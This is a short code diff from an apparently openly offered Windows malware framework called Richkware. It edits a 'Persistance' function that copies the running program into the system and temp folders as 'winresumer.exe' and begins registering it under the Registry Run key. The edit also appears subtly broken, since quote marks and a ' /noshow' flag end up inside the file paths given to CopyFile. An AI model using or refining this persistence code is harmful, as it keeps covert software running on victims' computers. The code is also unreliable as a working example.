@@ -66,18 +66,21 @@ void Richkware::RequestAdminPrivileges() {
 void Richkware::Persistance() {
 	// copy value in system
 	HMODULE module_handler = GetModuleHandle(NULL);
-	char system_path[MAX_PATH];
+	char system_path[MAX_PATH] = "\"";
 	char file_path[MAX_PATH];
-	char tmp_path[MAX_PATH];
+	char tmp_path[MAX_PATH] = "\"";
+	char tmp[MAX_PATH];
 
-	GetSystemDirectory(system_path, MAX_PATH);
 	GetModuleFileName(module_handler, file_path, MAX_PATH);
-	GetTempPath(MAX_PATH, tmp_path);
+	GetSystemDirectory(tmp, MAX_PATH);
+	strcat(system_path, tmp);
+	GetTempPath(MAX_PATH, tmp);
+	strcat(tmp_path, tmp);
 
-	strcat(system_path, "\\winresumer.exe");
+	strcat(system_path, "\\winresumer.exe\" /noshow");
 	CopyFile(file_path, system_path, true);
 
-	strcat(tmp_path, "winresumer.exe");
+	strcat(tmp_path, "winresumer.exe\" /noshow");
 	CopyFile(file_path, tmp_path, true);
 
 	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
